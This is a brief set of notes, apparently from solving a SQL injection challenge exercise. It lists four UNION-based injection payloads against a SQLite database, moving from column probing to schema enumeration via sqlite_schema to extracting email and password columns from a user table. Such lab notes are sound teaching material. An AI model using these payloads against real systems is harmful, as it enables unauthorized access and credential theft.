# SQL-Injection

> Emil Lindblad

Here are some *notes* from solving this challenge

```sql
Apple' UNION SELECT 1,2,3 ;--

Apple' UNION SELECT 1,2, name FROM sqlite_schema ;--

Apple' UNION SELECT 1,2, sql FROM sqlite_schema ;--

Apple' UNION SELECT email,password, name FROM user ;--

```
